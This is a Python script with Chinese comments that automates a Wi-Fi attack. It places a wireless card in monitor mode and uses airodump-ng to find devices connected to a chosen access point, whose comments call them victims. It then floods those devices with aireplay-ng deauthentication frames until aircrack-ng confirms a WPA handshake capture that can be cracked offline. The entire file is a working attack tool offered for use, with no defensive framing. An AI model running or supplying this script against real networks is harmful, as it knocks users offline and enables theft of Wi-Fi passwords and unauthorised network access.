import sys
import time
import subprocess
import os
import csv
import signal

# ================= 配置区域 =================
TMP_PREFIX = "/tmp/handshake_capture"
# 攻击强度配置
DEAUTH_COUNT_TARGETED = 15  # 定向攻击发包数 (针对特定手机，加大力度)
DEAUTH_COUNT_BROADCAST = 5  # 广播攻击发包数 (针对所有)
CHECK_INTERVAL = 3          # 循环间隔 (秒)
# ===========================================

def run_cmd(cmd):
    """执行系统命令并忽略错误输出"""
    try:
        # 使用 subprocess.run 更现代且安全
        result = subprocess.run(
            cmd, 
            shell=True, 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
        )
        return True
    except:
        return False

def get_cmd_output(cmd):
    """获取命令输出结果"""
    try:
        return subprocess.check_output(cmd, shell=True).decode(errors='ignore')
    except:
        return ""

def cleanup():
    """清理残留进程"""
    print("[*] 正在清理攻击进程...")
    os.system("killall airodump-ng aireplay-ng 2>/dev/null")

def ensure_monitor_mode(iface):
    """确保网卡处于监听模式"""
    print(f"[*] 初始化网卡: {iface}")
    os.system("airmon-ng check kill > /dev/null 2>&1")
    
    # 强制重置
    os.system(f"ip link set {iface} down")
    os.system(f"iw {iface} set type monitor")
    os.system(f"ip link set {iface} up")
    
    # 检查状态
    if "monitor" in get_cmd_output(f"iw dev {iface} info"):
        return iface
    
    # 备用方案
    os.system(f"airmon-ng start {iface} > /dev/null 2>&1")
    if os.path.exists(f"/sys/class/net/{iface}mon"):
        return f"{iface}mon"
    return iface

def get_connected_clients(csv_file, target_bssid):
    """
    [智能核心] 解析 airodump 的 CSV 文件
    实时提取连接到目标 BSSID 的所有客户端 MAC
    """
    clients = []
    if not os.path.exists(csv_file):
        return clients

    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            
        is_client_section = False
        target_bssid = target_bssid.upper()
        
        for line in lines:
            line = line.strip()
            # 只有遇到 "Station MAC" 之后才是客户端列表
            if "Station MAC" in line:
                is_client_section = True
                continue
            
            if is_client_section and line:
                parts = line.split(',')
                if len(parts) >= 6:
                    client_mac = parts[0].strip().upper()
                    connected_bssid = parts[5].strip().upper()
                    
                    # 过滤: 必须连接的是我们要攻击的那个 WiFi
                    if connected_bssid == target_bssid:
                        # 还可以过滤掉信号极差的 (-90以下)
                        clients.append(client_mac)
    except:
        pass
    
    # 去重
    return list(set(clients))

def check_handshake(cap_file):
    """检测是否捕获成功"""
    if not os.path.exists(cap_file): return False
    # 使用 aircrack-ng 快速检查
    output = get_cmd_output(f"aircrack-ng {cap_file}")
    return "1 handshake" in output

def main():
    if len(sys.argv) < 4:
        print("[!] 参数不足")
        sys.exit(1)

    target_bssid = sys.argv[1]
    target_channel = sys.argv[2]
    timeout = int(sys.argv[3])
    iface = sys.argv[4] if len(sys.argv) > 4 else "wlan0"

    print(f"[*] 启动智能攻击引擎 -> 目标: {target_bssid} (CH {target_channel})")
    
    mon_iface = ensure_monitor_mode(iface)
    
    # 清理旧数据
    os.system(f"rm -f {TMP_PREFIX}*")

    # 1. 锁定信道并启动监听 (后台)
    os.system(f"iwconfig {mon_iface} channel {target_channel}")
    
    # 同时输出 CAP (用于破解) 和 CSV (用于发现客户端)
    dump_cmd = f"airodump-ng --bssid {target_bssid} --channel {target_channel} --write {TMP_PREFIX} --output-format csv,cap {mon_iface} > /dev/null 2>&1 &"
    os.system(dump_cmd)
    
    start_time = time.time()
    captured = False
    
    try:
        while (time.time() - start_time) < timeout:
            time.sleep(CHECK_INTERVAL)
            elapsed = int(time.time() - start_time)
            
            # 2. [智能分析] 读取实时 CSV 寻找受害者
            csv_file = f"{TMP_PREFIX}-01.csv"
            clients = get_connected_clients(csv_file, target_bssid)
            
            # 3. [多模式攻击]
            if clients:
                # 模式 A: 精确打击 (效果最强)
                print(f"[*] ({elapsed}s) 发现 {len(clients)} 个设备，启动【定向阻断模式】...")
                for client in clients:
                    # -c 指定客户端，-0 指定数量 (加大到 15)
                    # 这种包手机很难忽略
                    run_cmd(f"aireplay-ng -0 {DEAUTH_COUNT_TARGETED} -a {target_bssid} -c {client} -D {mon_iface}")
            else:
                # 模式 B: 广播打击 (没人时盲扫，或者穿插使用)
                print(f"[*] ({elapsed}s) 暂未发现活跃设备，执行【广播覆盖模式】...")
                run_cmd(f"aireplay-ng -0 {DEAUTH_COUNT_BROADCAST} -a {target_bssid} -D {mon_iface}")

            # 4. 检查结果
            cap_file = f"{TMP_PREFIX}-01.cap"
            if check_handshake(cap_file):
                print("\n[SUCCESS] CAPTURED")
                print(f"[*] 握手包捕获成功: {cap_file}")
                captured = True
                break
                
    except KeyboardInterrupt:
        pass
    finally:
        cleanup()
    
    if not captured:
        print("\n[FAIL] TIMEOUT")

if __name__ == "__main__":
    main()